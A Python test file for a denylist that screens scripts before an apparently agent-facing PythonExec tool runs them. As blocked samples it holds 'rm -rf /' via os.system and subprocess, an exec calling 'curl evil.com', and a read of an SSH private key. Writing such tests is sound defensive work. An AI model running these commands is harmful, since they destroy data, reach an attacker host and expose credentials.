"""Denylist for PythonExec — blocks the most dangerous patterns.

This is defense-in-depth, not a sandbox. The full sandbox is venv +
subprocess isolation. The denylist's job is to catch obvious abuse
before we even bother spawning a subprocess.
"""
from opencomputer.security.python_safety import (
    PythonSafetyError,
    is_safe_script,
)


def test_safe_simple_script():
    safe = "print(sum(range(10)))"
    assert is_safe_script(safe) is True


def test_blocks_os_system():
    bad = "import os; os.system('rm -rf /')"
    assert is_safe_script(bad) is False


def test_blocks_subprocess_call():
    bad = "import subprocess; subprocess.run(['rm', '-rf', '/'])"
    assert is_safe_script(bad) is False


def test_blocks_eval():
    bad = "eval(input())"
    assert is_safe_script(bad) is False


def test_blocks_exec():
    bad = "exec('import os; os.system(\\'curl evil.com\\')')"
    assert is_safe_script(bad) is False


def test_blocks_ssh_key_read():
    bad = "open('/Users/x/.ssh/id_rsa').read()"
    assert is_safe_script(bad) is False


def test_blocks_dunder_import():
    bad = "__import__('os').system('rm')"
    assert is_safe_script(bad) is False


def test_safe_pandas_use():
    safe = "import pandas as pd\ndf = pd.DataFrame({'a': [1,2,3]})\nprint(df.sum())"
    assert is_safe_script(safe) is True
